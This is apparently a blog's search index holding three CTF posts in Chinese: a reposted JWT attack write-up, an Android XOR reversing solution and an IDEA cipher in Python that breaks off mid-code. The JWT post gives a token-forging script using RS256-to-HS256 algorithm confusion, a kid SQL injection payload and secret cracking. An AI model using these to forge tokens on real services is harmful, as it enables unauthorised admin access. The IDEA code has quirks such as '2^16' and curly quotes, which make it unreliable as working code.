<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>(转)Json_web_token_攻击</title>
    <url>/2019/05/20/(json%20web%20token)JWT%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>前记<br>最近国赛+校赛遇到两次json web token的题，发现自己做的并不算顺畅，于是有了这篇学习文章。</p>
<p>为什么要使用Json Web Token<br>Json Web Token简称jwt</p>
<p>顾名思义，可以知道是用于身份认证的</p>
<p>那么为什么要有身份认证？</p>
<p>我们知道HTTP是无状态的，打个比方：</p>
<p>有状态：</p>
<p>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：还不错，挺好吃的。</p>
<p>无状态：</p>
<p>A：你今天中午吃的啥？<br>B：吃的大盘鸡。<br>A：味道怎么样呀？<br>B：？？？啊？啥？啥味道怎么样？</p>
<p>那么怎么样可以让HTTP记住曾经发生的事情呢？</p>
<p>这里的选择可以很多：cookie,session,jwt</p>
<p>对于一般的cookie，如果我们的加密措施不当，很容易造成信息泄露，甚至信息伪造，这肯定不是我们期望的。</p>
<p>那么对于session呢？</p>
<p>对于session:客户端在服务端登陆成功之后，服务端会生成一个sessionID，返回给客户端，客户端将sessionID保存到cookie中，例如phpsessid，再次发起请求的时候，携带cookie中的sessionID到服务端，服务端会缓存该session（会话），当客户端请求到来的时候，服务端就知道是哪个用户的请求，并将处理的结果返回给客户端，完成通信。</p>
<p>但是这样的机制会存在一些问题：</p>
<p>1、session保存在服务端，当客户访问量增加时，服务端就需要存储大量的session会话，对服务器有很大的考验；</p>
<p>2、当服务端为集群时，用户登陆其中一台服务器，会将session保存到该服务器的内存中，但是当用户的访问到其他服务器时，会无法访问，通常采用缓存一致性技术来保证可以共享，或者采用第三方缓存来保存session，不方便。</p>
<p>所以这个时候就需要jwt了</p>
<p>在身份验证中，当用户使用他们的凭证成功登录时，JSON Web Token将被返回并且必须保存在本地（通常在本地存储中，但也可以使用Cookie），而不是在传统方法中创建会话服务器并返回一个cookie。</p>
<p>无论何时用户想要访问受保护的路由或资源，用户代理都应使用承载方案发送JWT，通常在授权header中。header的内容应该如下所示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure>
<p>这是一种无状态身份验证机制，因为用户状态永远不会保存在服务器内存中。服务器受保护的路由将在授权头中检查有效的JWT，如果存在，则允许用户访问受保护的资源。由于JWT是独立的，所有必要的信息都在那里，减少了多次查询数据库的需求。</p>
<p>这使我们可以完全依赖无状态的数据API，无论哪些域正在为API提供服务，因此跨源资源共享（CORS）不会成为问题，因为它不使用Cookie。</p>
<p>Json Web Token结构<br>那么一般jwt长什么样子呢？</p>
<p>我们随便挑一个看看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-0TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure>
<p>不妨解密一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;adminsky&quot;</span>,<span class="string">&quot;priv&quot;</span>:<span class="string">&quot;other&quot;</span>&#125;乱码</span><br></pre></td></tr></table></figure>
<p>不难看出，jwt解码后分为3个部分，由三个点（.）分隔</p>
<p>分别为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Header</span><br><span class="line">Payload</span><br><span class="line">Signature</span><br></pre></td></tr></table></figure>
<p>Header<br>通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。</p>
<p>正如json所显示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>alg为算法的缩写，typ为类型的缩写</p>
<p>然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。</p>
<p>Payload<br>令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。</p>
<p>这里是用户随意定义的数据</p>
<p>例如上面的举例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:<span class="string">&quot;adminsky&quot;</span>,</span><br><span class="line">    <span class="string">&quot;priv&quot;</span>:<span class="string">&quot;other&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。</p>
<p>但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。</p>
<p>Signature<br>要创建签名部分，必须采用header，payload，密钥</p>
<p>然后利用header中指定算法进行签名</p>
<p>例如HS256(HMAC SHA256),签名的构成为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64Encode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64Encode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>
<p>然后将这部分base64编码形成JSON Web Token第三部分</p>
<p>Json Web Token攻击手段<br>既然JWT作为一种身份验证的手段，那么必然存在伪造身份的恶意攻击，那么我们下面探讨一下常见的JWT攻击手段</p>
<p>算法修改攻击<br>我们知道JWT的header部分中，有签名算法标识alg</p>
<p>而alg是用于签名算法的选择，最后保证用户的数据不被篡改。</p>
<p>但是在数据处理不正确的情况下，可能存在alg的恶意篡改</p>
<p>例如由于网站的不严谨，我们拿到了泄露的公钥pubkey</p>
<p>我们知道如果签名算法为RS256，那么会选择用私钥进行签名，用公钥进行解密验证</p>
<p>假设我们只拿到了公钥，且公钥模数极大，不可被分解，那么如何进行攻击呢？</p>
<p>没有私钥我们是几乎不可能在RS256的情况下篡改数据的，因为第三部分签名需要私钥，所以我们可以尝试将RS256改为HS256</p>
<p>此时即非对称密码变为对称加密</p>
<p>我们知道非对称密码存在公私钥问题</p>
<p>而对称加密只有一个key</p>
<p>此时如果以pubkey作为key对数据进行篡改，则会非常简单，而如果后端的验证也是根据header的alg选择算法，那么显然正中下怀。</p>
<p>下面以一道实战为例进行说明：</p>
<p>拿到题目<a href="http://pastebin.bxsteam.xyz">http://pastebin.bxsteam.xyz</a></p>
<p>一开始不知道是要做什么，所以先查看源码</p>
<p>发现<a href="http://pastebin.bxsteam.xyz/static/js/common.js">http://pastebin.bxsteam.xyz/static/js/common.js</a></p>
<p>其中几个点引人注目</p>
<p>关注点1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">auth = <span class="string">&quot;Bearer &quot;</span> + token;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">&#x27;/list&#x27;</span>,</span><br><span class="line">    type: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    headers:&#123;<span class="string">&quot;Authorization&quot;</span>:auth&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>存在web token</p>
<p>关注点2:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现有一个存放公钥的目录</p>
<p>所以立刻想到了json web token</p>
<p>于是我抓包查看token</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2Ijoib3RoZXIifQ.AoTc1q2NAErgqk6EeTK4MGH7cANVVF9XTy0wLv8HpgUfNcdM-etmv0Y9XmOuygF_ymV1rF6XQZzLrtkFqdMdP0NaZnTOYH35Yevaudx9bVpu9JHG4qeXo-0TXBcpaPmBaM0V0GxyZRNIS2KwRkNaxAQDQnyTN-Yi3w8OVpJYBiI</span><br></pre></td></tr></table></figure>
<p>使用<a href="https://jwt.io/">https://jwt.io/</a></p>
<p>得到3段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;adminsky&quot;</span>,</span><br><span class="line">  <span class="string">&quot;priv&quot;</span>: <span class="string">&quot;other&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">signature</span><br></pre></td></tr></table></figure>
<p>所以我的想法就是探测pubkey泄露，利用公私钥伪造json web token</p>
<p>因为这个题的机制是私钥加密，公钥解密</p>
<p>所以只要我们能拿到私钥，即可伪造json web token</p>
<p>关注到格式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">getpubkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;hash&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>天真的我尝试了<br>md5(username)<br>md5(salt.username)<br>md5(username.salt)</p>
<p>其中salt试了无数，例如Bearer,bxs,rebirth</p>
<p>都没有成功，心态崩了，暂且搁置</p>
<p>后来得到提示<br>Web Pastebin /pubkey/md5(username+password)</p>
<p>我才发现是username+password</p>
<p>访问<br><a href="http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e">http://pastebin.bxsteam.xyz/pubkey/4eb8deaa574fdc8257e39b5dd4c6490e</a></p>
<p>得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;pubkey&quot;</span>:<span class="string">&quot;-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCtRgwKdQFRKkXupJ8lHIXT/QTinmT9lobR6+1m4ubQXFaBlM7sJkzaoasPdU6e/5dJ5TelQSC59deolcXJ1iHf4/QmzndDX3L/ShtfPXZEGKkYCKC2kF0ekBz4W4LSQfaunZEz/yoScLqz9wOP8vwxAYN+P1nFtFrTzMdBYo8begEewIDAQABn-----END PUBLIC KEY-----&quot;</span>,<span class="string">&quot;result&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p>解析公钥<br>key长度：    1024<br>模数：    AD460C0A7501512A45EEA49F251C85D3FD04E2993F65A1B47AFB59B8B9B41715A06533BB099336A86AC3DD53A7BFE5D2794DE950482E7D75EA257172758877F8FD09B37435F72FF4A1B5F3D764418A91808A0B6905D1E901CF85B82D241F6AE9D9133FF2A1270BAB3F7038FF2FC3101837E3F516D16B4F331D058A3C6DE8047B<br>指数：    65537 (0x10001)</p>
<p>本想尝试分解，但发现1024bit的n基本无解，所以私钥是不可能获取了，这个时候我的思路其实被灭杀了。</p>
<p>因为没有私钥基本不能篡改json web token，毕竟无法通过消息验证码校验</p>
<p>而这里就需要修改算法RS256为HS256（非对称密码算法 =&gt; 对称密码算法）</p>
<p>算法HS256使用秘密密钥对每条消息进行签名和验证。</p>
<p>算法RS256使用私钥对消息进行签名，并使用公钥进行验证。</p>
<p>如果将算法从RS256更改为HS256，后端代码会使用公钥作为秘密密钥，然后使用HS256算法验证签名。</p>
<p>由于公钥有时可以被攻击者获取到，所以攻击者可以修改header中算法为HS256，然后使用RSA公钥对数据进行签名。</p>
<p>后端代码会使用RSA公钥+HS256算法进行签名验证。</p>
<p>即更改算法为HS256，此时即不存在公钥私钥问题，因为对称密码算法只有一个key</p>
<p>此时即我们可以任意访问的pubkey</p>
<p>故此我立刻写出了构造脚本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">public</span> = open(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">print jwt.encode(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;adminsky&quot;</span>,<span class="string">&quot;priv&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;, key=<span class="keyword">public</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>注：1.txt为公钥</p>
<p>priv为admin，因为之前为other，即其他人，同时只有admin可以读flag，所以这里猜测为admin</p>
<p>运行发现报错：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File <span class="string">&quot;G:python2.7libsite-packagesjwtalgorithms.py&quot;</span>, line <span class="number">151</span>, in prepare_key</span><br><span class="line">    <span class="string">&#x27;The specified key is an asymmetric key or x509 certificate and&#x27;</span></span><br><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure>
<p>发现源码的第151行爆破了，于是去跟踪库的源码</p>
<p>发现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">prepare_key</span><span class="params">(self, key)</span>:</span></span><br><span class="line"><span class="function">        key </span>= force_bytes(key)</span><br><span class="line"></span><br><span class="line">        invalid_strings = [</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN CERTIFICATE-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;-----BEGIN RSA PUBLIC KEY-----&#x27;</span>,</span><br><span class="line">            b<span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">if</span> <span class="title">any</span><span class="params">([string_value in key <span class="keyword">for</span> string_value in invalid_strings])</span>:</span></span><br><span class="line"><span class="function">            raise <span class="title">InvalidKeyError</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="string">&#x27;The specified key is an asymmetric key or x509 certificate and&#x27;</span></span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="string">&#x27; should not be used as an HMAC secret.&#x27;</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        return key</span></span><br></pre></td></tr></table></figure>
<p>prepare_key会判断是否有非法字符，简单粗暴的注释掉<br>def prepare_key(self, key):<br>        key = force_bytes(key)<br>        return key</p>
<p>保存后再运行得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW5za3kiLCJwcml2IjoiYWRtaW4ifQ.zc8m-ymnOrwuvd2kdsKMBVrT_9JXPXHkFf4vcPWecqI</span><br></pre></td></tr></table></figure>
<p>然后利用这个去访问list</p>
<p>即可得到admin的消息<br><img src="https://img-blog.csdnimg.cn/2019051621563087.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin:4fd5988f73c7a414f4c947e9fd708811</p>
<p>访问<br><a href="http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811">http://pastebin.bxsteam.xyz/text/admin:4fd5988f73c7a414f4c947e9fd708811</a></p>
<p>得到flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;content&quot;</span>:<span class="string">&quot;cumtctf&#123;jwt_is_not_safe_too_much&#125;&quot;</span>,<span class="string">&quot;result&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p>至此，我们成功用修改算法攻击(非对称密码 =&gt; 对称密码)破解了此题</p>
<p>密钥可控问题<br>题目1：</p>
<p>在国赛中，我遇到了这样的JWT:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJzaGEyNTYiLCJraWQiOiI4MjAxIn0.eyJuYW1lIjoiYWRtaW4yMzMzIn0.aC0DlfB3pbeIqAQ18PaaTOPA5PSipJe651w7E0BZZRI</span><br><span class="line"></span><br><span class="line">header头：</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;sha256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>:<span class="string">&quot;8201&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中kid为密钥key的编号id<br>类似逻辑为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sql=<span class="string">&quot;select * from table where kid=$kid&quot;</span></span><br></pre></td></tr></table></figure>
<p>这样查询出来的值即为key的值<br>但是如果我们在这里进行恶意篡改，例如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">kid <span class="operator">=</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">12345</span></span><br></pre></td></tr></table></figure>
<p>这样查询出来的结果必然为12345</p>
<p>这样等同于我们控制了密钥key</p>
<p>拥有了密钥key，那么即可任意伪造消息，达到成为admin登入的目的了<br>题目2：</p>
<p>同样在HITB 2017中也存在一道这样可控密钥的题目</p>
<p>这里的详情可以在最后的参考链接中查看，这里我简要叙述一下</p>
<p>首先header中同样存在kid可控问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>:<span class="string">&quot;keys/3c3c2ea1c3f113f649dc9389dd71b851&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;RS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并且题目存在写消息保存于本地的功能</p>
<p>于是最后可以自己写公钥，保存于服务器</p>
<p>利用kid可控的路径去加载自己写的公钥</p>
<p>然后用相应的私钥去篡改信息，伪造admin，利用我们自己写的公钥进行验证</p>
<p>密钥爆破问题<br>我们知道在HS签名算法中，只有一个密钥</p>
<p>如果这个密钥的复杂度不够，或者为弱口令</p>
<p>那么很容易导致攻击者轻松的破解，达到篡改消息，伪造身份的目的</p>
<p>破解工具也有现成的：<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>使用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>
<p>即可得到密钥：Sn1f</p>
<p>然后即可进行消息的恶意伪造，篡改</p>
<p>参考链接<br><a href="https://jwt.io">https://jwt.io</a><br><a href="https://www.jianshu.com/p/e64d96b4a54d">https://www.jianshu.com/p/e64d96b4a54d</a><br><a href="https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/">https://chybeta.github.io/2017/08/29/HITB-CTF-2017-Pasty-writeup/</a><br><a href="https://delcoding.github.io/2018/03/jwt-bypass/">https://delcoding.github.io/2018/03/jwt-bypass/</a><br><a href="http://www.cnblogs.com/dliv3/p/7450057.html">http://www.cnblogs.com/dliv3/p/7450057.html</a></p>
<p>转载自：<a href="https://www.anquanke.com/post/id/145540">https://www.anquanke.com/post/id/145540</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>(whaleAndroid)app-Release</title>
    <url>/2019/04/30/(whale)app-release/</url>
    <content><![CDATA[<p>这是一个安卓逆向题。用安卓逆向工具进行分析，我在这里用的<code>jeb</code>工具，附上资源和无法正常启动解决方案的链接：<a href="https://www.52pojie.cn/thread-722648-1-1.html运行">https://www.52pojie.cn/thread-722648-1-1.html运行</a><code>jeb</code>，将<strong>app-release. apk</strong>拉入<code>jeb</code>进行分析<br><img src="https://img-blog.csdnimg.cn/20190430120522775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">展开<strong>Bytecode</strong>查看该应用代码结构<br><img src="https://img-blog.csdnimg.cn/20190430120742883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现有两个java源码文件，分别查看，发现<code>a</code>中使用了<code>MainActivity</code><br><img src="https://img-blog.csdnimg.cn/20190430120840662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看<code>MainActivity</code>的内容，发现一个加密循环，是将一串字符的每一个字符都和18进行异或<br><img src="https://img-blog.csdnimg.cn/2019043012125930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTAwODc3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>结合<code>a</code>的代码确定，将一串字符串通过<code>MainActivity</code>内的加密得到的密文和</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PXEJPMQFTiS|v`\&quot;#vMDw`KMA3_b~w3o</span><br></pre></td></tr></table></figure>
<p>进行对比，若一样则显示<strong>Contratulations! You Got Correct Flag.</strong><br>那么将</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PXEJPMQFTiS|v`\&quot;#vMDw`KMA3_b~w3o</span><br></pre></td></tr></table></figure>
<p>与18异或一次即可得到应输入的字符串脚本如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[]=&#123;<span class="string">&quot;PXEJPMQFTiS|v`\&quot;#vMDw`KMA3_b~w3o&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;<span class="number">39</span>;n++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[n]^=<span class="number">18</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Re</category>
      </categories>
      <tags>
        <tag>Re</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>(密码学)(crypto)IDEA_Crypto(ECB模式)——python实现</title>
    <url>/2020/04/30/(crypto)IDEA_Crypto(ECB)/</url>
    <content><![CDATA[<p>```python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>def FindMODreverse(a,m):                        # 欧几里得除法求模逆元<br>    m_tmp = m<br>    x_1,x_2 = 1,0<br>    y_1,y_2 = 0,1<br>    while m != 0:<br>        q = a//m<br>        x_2,y_2,m,x_1,y_1,a = (x_1 - q <em> x_2),(y_1 - q </em> y_2),a % m,x_2,y_2,m<br>    while x_1 &lt; 0:<br>        x_1 += m_tmp<br>    while x_1 &gt;= m_tmp:<br>        x_1 -= m_tmp<br>    return x_1</p>
<p>def ROL(lit,num):                               # 循环左移 num 位<br>    return lit[num:] + lit[:num]</p>
<p>def idea_xor(x,y):                              # 逐位异或<br>    tmp = ‘’ ; i = 0<br>    while True:<br>        try:<br>            tmp += str(int(x[i],2)^int(y[i],2))<br>            i += 1<br>        except:<br>            return tmp</p>
<p>def idea_add(x,y):                              # 模65536相加<br>    x = int(x,2) ; y = int(y,2)<br>    z = ( x + y ) % 65536<br>    z = bin(z)[2:]<br>    tmp = ‘0’*(16 - len(z)) + z<br>    return tmp</p>
<p>def idea_mul(x,y):                              # 模65537相乘<br>    x = int(x,2) ; y = int(y,2)<br>    if x == 0:<br>        x = 2^16<br>    if y == 0:<br>        y = 2^16<br>    z = ( ( x <em> y ) % 65537 ) % 65536<br>    z = bin(z)[2:]<br>    tmp = ‘0’</em>(16 - len(z)) + z<br>    return tmp</p>
<p>def idea_encode(m,num,key):                     # 加密过程<br>    x_array = [m[i<em>16:i</em>16+16] for i in range(4)]<br>    z_array = key[num<em>6:num</em>6+6]</p>
<pre><code>if num &lt; 8:
    out_1 = idea_mul(x_array[0],z_array[0])
    out_2 = idea_add(x_array[1],z_array[1])
    out_3 = idea_add(x_array[2],z_array[2])
    out_4 = idea_mul(x_array[3],z_array[3])
    out_5 = idea_mul(z_array[4],idea_xor(out_1,out_3))
    out_6 = idea_mul(z_array[5],idea_add(idea_xor(out_2,out_4),out_5))
    out_7 = idea_add(out_5,out_6)

    w_1 = idea_xor(out_1,out_6)
    w_2 = idea_xor(out_3,out_6)
    w_3 = idea_xor(out_2,out_7)
    w_4 = idea_xor(out_4,out_7)

    c = w_1 + w_2 + w_3 + w_4

    num += 1
    c = idea_encode(c,num,key)
else:
    y_1 = idea_mul(x_array[0],z_array[0])
    y_2 = idea_add(x_array[2],z_array[1])
    y_3 = idea_add(x_array[1],z_array[2])
    y_4 = idea_mul(x_array[3],z_array[3])
    c = y_1 + y_2 + y_3 + y_4

return c
</code></pre><p>def IDEA_Crypto(cm_str,key,mode):<br>    if mode == 0:<br>        if len(cm_str) % 8 != 0:                         # 对明文进行填充<br>            cm_str += ‘\x00’ * ( 8 - len(cm_str) % 8 )</p>
<pre><code>    m_bin = &#39;&#39;                                       # 将明文转化为二元序列
    for i in cm_str.encode(&#39;utf-8&#39;):
        i = bin(i)[2:]
        m_bin += &#39;0&#39;*(8 - len(i)) + i
else:                                                # 将密文转化为二元序列
    c_bin = bin(int(cm_str,16))[2:]
    if len(c_bin) % 8 != 0:
        c_bin = &#39;0&#39;*(8 - (len(c_bin) % 8)) + c_bin

key_bin = &#39;&#39;                                         # 将密钥转化为二元序列
for i in key.encode(&#39;utf-8&#39;):
    i = bin(i)[2:]
    key_bin += &#39;0&#39;*(8 - len(i)) + i

key_encrypt_array = []                                       # 生成加密子密钥
for i in range(6):
    for j in [key_bin[k*16:k*16+16] for k in range(8)]:
        key_encrypt_array.append(j)
    key_bin = ROL(key_bin,25)
else:
    key_encrypt_array.extend([key_bin[k*16:k*16+16] for k in range(8)][:4])

key_decrypt_array = [] ; flag = 0                            # 生成解密子密钥
key_tmp_array = key_encrypt_array[::-1]
for i in [key_tmp_array[i*6:i*6+6] for i in range(8)]:
    i[:4] = i[3::-1] ; i[-2:] = i[:-3:-1]

    if flag == 0:                                            # 第一轮和最后一轮的第二三子密钥特殊取值
        Addrev = bin((65536 - int(i[1],2)) % 65536)[2:]
        i[1] = &#39;0&#39;*(16-len(Addrev)) + Addrev
        Addrev = bin((65536 - int(i[2],2)) % 65536)[2:]
        i[2] = &#39;0&#39;*(16-len(Addrev)) + Addrev
        flag += 1
    else:
        Addrev = bin((65536 - int(i[1],2)) % 65536)[2:]
        tmp_1 = &#39;0&#39;*(16-len(Addrev)) + Addrev
        Addrev = bin((65536 - int(i[2],2)) % 65536)[2:]
        tmp_2 = &#39;0&#39;*(16-len(Addrev)) + Addrev
        i[1] = tmp_2
        i[2] = tmp_1

    Modrev = bin(FindMODreverse(int(i[0],2),65537))[2:]
    i[0] = &#39;0&#39;*(16-len(Modrev)) + Modrev
    Modrev = bin(FindMODreverse(int(i[3],2),65537))[2:]
    i[3] = &#39;0&#39;*(16-len(Modrev)) + Modrev

    key_decrypt_array.extend(i)
else:                                                       # 最后一轮第九轮的解密密钥
    i = key_tmp_array[-4:][::-1]

